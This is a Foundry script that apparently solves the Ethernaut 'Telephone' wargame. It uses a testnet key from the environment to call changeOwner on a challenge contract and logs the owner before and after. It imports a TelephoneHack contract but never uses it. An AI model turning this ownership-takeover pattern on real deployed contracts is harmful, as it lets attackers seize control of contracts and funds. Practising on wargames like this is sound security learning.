// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import {TelephoneHack} from "src/test/TelephoneHack.sol";

interface ITelephone {
    function changeOwner(address) external;

    function owner() external view returns (address);
}

contract TelephoneScript is Script {
    event Owner(address);

    function run() external {
        ITelephone telephone = ITelephone(vm.envAddress("TELEPHONE_ADDRESS"));
        uint256 deployerKey = vm.envUint("TESTNET_PRIVATE_KEY_2");
        vm.startBroadcast(deployerKey);
        emit Owner(telephone.owner());
        telephone.changeOwner(vm.envAddress("TESTNET_ADDRESS_1"));
        emit Owner(telephone.owner());
    }
}
